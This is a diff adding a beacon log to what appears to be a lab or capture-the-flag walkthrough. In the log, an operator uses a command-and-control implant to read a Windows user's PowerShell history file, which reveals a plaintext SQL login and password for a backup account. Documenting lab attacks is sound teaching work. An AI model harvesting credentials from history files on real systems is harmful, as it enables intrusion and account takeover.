@@ -903,6 +903,22 @@ I now have a beacon as this user!
 # Enumeration as `c.white`
 
 ```python
++--- Task [bcbca4e5] closed ----------------------------------------------------------+
+
+[30/07 20:52:01] operator [332809d9] beacon > cat C:/Users/c.white/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
+[30/07 20:52:01] [*] Task: read file
+[30/07 20:52:03] [*] Agent called server, sent [113 bytes]
+[30/07 20:52:04] [+] 'C:/Users/c.white/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt' file content:
+whoami
+sqlcmd -S localhost -U backup_operator -P 'BackupOps2026!'
+icacls "C:\BackupDB"
+cd C:\BackupDB
+dir
+
++--- Task [332809d9] closed ----------------------------------------------------------+
+```
+
+```python
 +--- Task [8be78b27] closed ----------------------------------------------------------+
 
 [30/07 20:34:43] operator [39d8682d] beacon > ls
